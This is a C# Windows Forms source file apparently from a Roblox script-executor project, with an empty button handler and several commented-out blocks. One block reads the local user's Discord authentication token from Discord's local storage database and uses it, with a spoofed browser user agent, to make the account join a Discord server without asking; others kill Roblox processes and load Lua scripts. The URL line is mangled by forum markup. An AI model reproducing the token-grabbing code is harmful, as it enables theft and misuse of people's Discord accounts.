using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net; 

namespace Activation
{
    public partial class Form2 : Form
    {

        public Form2()
        {
            InitializeComponent();
        }

        /*
        public static void Join(string serverID)
        {
        HttpWebRequest discordRequest = (HttpWebRequest)WebRequest.Create($"[url=https://discordapp.com/api/v6/invite/%7BserverID%7D]https://discordapp.c...e/{serverID}");
        discordRequest.Method = "POST";
        discordRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0";
        discordRequest.AutomaticDecompression = DecompressionMethods.GZip;
        discordRequest.Headers.Add("Authorization", DiscordToken());
        discordRequest.ContentLength = 0;
        var response = (HttpWebResponse)discordRequest.GetResponse();
        }

        static string DiscordToken()
        {
            string file = $"C:\\Users\\{Environment.UserName}\\AppData\\Roaming\\discord\\Local Storage\\https_discordapp.com_0.localstorage";
            StringBuilder remControlChar = new StringBuilder(256);

            using (SQLiteConnection conn = new SQLiteConnection($"data source={file}"))
            {
                using (SQLiteCommand comm = new SQLiteCommand("SELECT key, value FROM ItemTable", conn))
                {
                    conn.Open();

                    SQLiteDataReader reader = comm.ExecuteReader();

                    while (reader.Read())
                    {
                        if ((string)reader["Key"] == "token")
                        {
                            string tokenReturn = Encoding.Default.GetString((byte[])reader["Value"]).Replace('\"', ' ');
                            char singleCharacter;

                            for (int i = 0; i < tokenReturn.Length; i++)
                            {
                                singleCharacter = tokenReturn[i];
                                if (!char.IsControl(singleCharacter))
                                {
                                    remControlChar.Append(singleCharacter);
                                }
                            }
                        }
                    }
                    reader.Close();
                    conn.Close();
                }
            }
            return $"{remControlChar}";
        }*/

        /*

             Process[] processesByName = Process.GetProcessesByName("RobloxPlayerBeta");
             for (int i = 0; i < processesByName.Length; i++)
             {
                 Process process = processesByName[i];
                 process.Kill();
                 MessageBox.Show("Roblox got killed X_X", "OOF ROBLOX GET R3KT!", MessageBoxButtons.OK, MessageBoxIcon.Information);
             }
         */

        /*
            OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.FileName = "";
            openFileDialog.Filter = "Text Scripts|*txt|All Files (*-*)|*.*|Lua Files|*lua|";
            openFileDialog.ShowDialog();
            string text = File.ReadAllText(Path.GetFullPath(openFileDialog.FileName));
            this.LuaTxTbox.Text = text;
        */

        private void button1_Click(object sender, EventArgs e)
        {

        }
        
    }
}
